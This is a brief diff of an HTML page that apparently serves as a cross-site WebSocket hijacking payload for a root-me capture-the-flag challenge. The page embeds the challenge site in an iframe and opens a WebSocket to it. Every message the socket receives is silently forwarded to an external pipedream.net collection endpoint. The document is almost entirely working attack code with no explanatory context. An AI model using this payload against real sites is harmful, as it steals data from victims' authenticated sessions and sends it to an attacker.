@@ -1,8 +1,9 @@
 <h1>Test v2</h1>
+<iframe src="http://ctf17.root-me.org/room"></iframe>
 <script>
     var ws = new WebSocket('ws://ctf17.root-me.org/ws');
     ws.onopen = function() {
-        ws.send("READY");
+        ws.send("hello");
     };
     ws.onmessage = function(event) {
         fetch('https://eotoci65n24zl7e.m.pipedream.net/', {method: 'POST', mode: 'no-cors', body: event.data});
